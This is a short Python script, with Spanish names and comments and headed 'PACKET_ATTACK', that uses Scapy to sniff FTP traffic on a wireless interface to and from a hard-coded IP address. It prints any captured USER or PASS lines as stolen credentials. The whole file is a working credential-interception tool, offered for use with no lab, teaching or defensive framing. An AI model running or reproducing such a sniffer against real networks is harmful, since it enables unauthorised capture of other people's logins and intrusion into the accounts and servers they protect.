## PACKET_ATTACK

from scapy.all import *

host = "74.179.81.132"

def sniffer_de_trafico(host):
    filtro_bpf = f"tcp port 21 and host {host}"
    paquetes = sniff(filter=filtro_bpf, iface="wlan0", timeout=30)

    for pack in paquetes:
        if pack.haslayer(Raw):  # Si hay datos en claro
            try:
                data = pack[Raw].load.decode(errors="ignore")
                if "USER" in data or "PASS" in data:
                    print("[*] Credencial capturada:", data.strip())
            except:
                pass


if __name__ == "__main__":
    sniffer_de_trafico(host)

